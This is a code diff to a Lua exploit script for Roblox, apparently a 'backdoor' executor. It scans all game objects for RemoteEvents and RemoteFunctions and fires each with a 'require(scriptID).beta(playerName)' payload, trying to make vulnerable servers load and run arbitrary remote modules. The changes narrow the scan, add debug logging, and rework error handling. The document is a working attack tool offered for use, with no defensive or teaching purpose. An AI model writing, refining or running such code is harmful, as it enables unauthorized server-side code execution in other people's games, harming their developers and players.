@@ -17,23 +17,19 @@ end
 -- Optimized Backdoor Scan Function with Coroutine
 local function scanForBackdoors()
     local backdoors = {}
-    local methods = {"RemoteEvent", "RemoteFunction", "ModuleScript", "Script"}
-
+    local methods = {"RemoteEvent", "RemoteFunction"}
+    
     for _, obj in pairs(game:GetDescendants()) do
-        -- Yield periodically to avoid freezing
-        if #backdoors % 100 == 0 then
-            wait()
-        end
-
+        if #backdoors % 100 == 0 then wait() end
+        
         for _, method in pairs(methods) do
-            if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
+            if obj:IsA(method) then
                 table.insert(backdoors, obj)
-            end
-            if obj:IsA("Script") and obj.Source:find("require") then
-                table.insert(backdoors, obj)
+                print("[DEBUG] Found backdoor:", obj:GetFullName(), "Type:", method)
             end
         end
     end
+    print("[DEBUG] Total backdoors found:", #backdoors)
     return backdoors
 end
 
@@ -41,23 +37,27 @@ end
 local function executeServerRequire(scriptID)
     showNotification("Warning", "You might encounter some bugs or crashes. Also, it might freeze.", 5)
     local backdoors = scanForBackdoors()
+    
     for _, backdoor in ipairs(backdoors) do
-        local success, result = pcall(function()
-            local code = ('require(%s).beta("%s")'):format(scriptID, game.Players.LocalPlayer.Name)
-            if backdoor:IsA("RemoteFunction") then
-                return backdoor:InvokeServer(code)
-            elseif backdoor:IsA("RemoteEvent") then
-                backdoor:FireServer(code)
-                return "[SUCCESS] Fired RemoteEvent"
+        if backdoor then
+            local success, result = pcall(function()
+                local code = ('require(%s).beta("%s")'):format(scriptID, game.Players.LocalPlayer.Name)
+                if backdoor:IsA("RemoteFunction") then
+                    return backdoor:InvokeServer(code)
+                elseif backdoor:IsA("RemoteEvent") then
+                    backdoor:FireServer(code)
+                    return "[SUCCESS] Fired RemoteEvent"
+                else
+                    error("[ERROR] No suitable RemoteFunction or RemoteEvent found")
+                end
+            end)
+            
+            if success then
+                print("[SUCCESS] Script Executed Successfully via:", backdoor:GetFullName())
+                return result
             else
-                error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor:GetFullName())
+                warn("[ERROR] Execution Failed on:", backdoor:GetFullName(), "Error:", result)
             end
-        end)
-        if success then
-            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor:GetFullName())
-            return result
-        else
-            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor:GetFullName() .. " - " .. result)
         end
     end
     warn("[ERROR] No suitable backdoor found for script execution.")
